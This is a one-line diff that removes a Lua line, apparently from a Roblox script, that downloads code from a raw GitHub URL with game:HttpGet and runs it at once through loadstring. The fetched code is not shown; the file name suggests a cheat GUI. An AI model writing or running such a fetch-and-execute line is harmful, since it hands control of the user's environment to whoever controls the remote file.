@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/Averymoistboi/Aesomegut/main/bestguiever'),true))()
